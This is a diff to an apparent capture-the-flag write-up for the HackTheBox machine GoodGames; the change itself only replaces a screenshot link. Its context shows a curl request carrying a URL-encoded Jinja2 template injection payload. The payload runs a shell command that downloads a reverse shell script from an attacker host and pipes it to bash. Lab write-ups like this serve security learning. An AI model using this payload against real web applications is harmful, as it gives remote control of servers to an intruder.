@@ -1095,5 +1095,6 @@ curl -i -s -k -X $'POST' \
     --data-binary $'name=%7b%7b%72%65%71%75%65%73%74%2e%61%70%70%6c%69%63%61%74%69%6f%6e%2e%5f%5f%67%6c%6f%62%61%6c%73%5f%5f%2e%5f%5f%62%75%69%6c%74%69%6e%73%5f%5f%2e%5f%5f%69%6d%70%6f%72%74%5f%5f%28%27%6f%73%27%29%2e%70%6f%70%65%6e%28%27%63%75%72%6c%20%31%30%2e%31%30%2e%31%34%2e%36%3a%38%30%30%30%2f%72%65%76%65%72%73%68%65%6c%6c%20%7c%20%62%61%73%68%27%29%2e%72%65%61%64%28%29%7d%7d' \
     $'http://internal-administration.goodgames.htb/settings'
 ```
+Catch the shell and enjoy!
+![Catch the shell and enjoy](https://user-images.githubusercontent.com/1907220/209875015-a2941baa-f902-4d62-a895-e9dc00f38ae6.png)
 
-!{Catch the shell and enjoy!}(/loot/screenshots/2022-12-28_16-35-catch_a_falling_Shell.png)
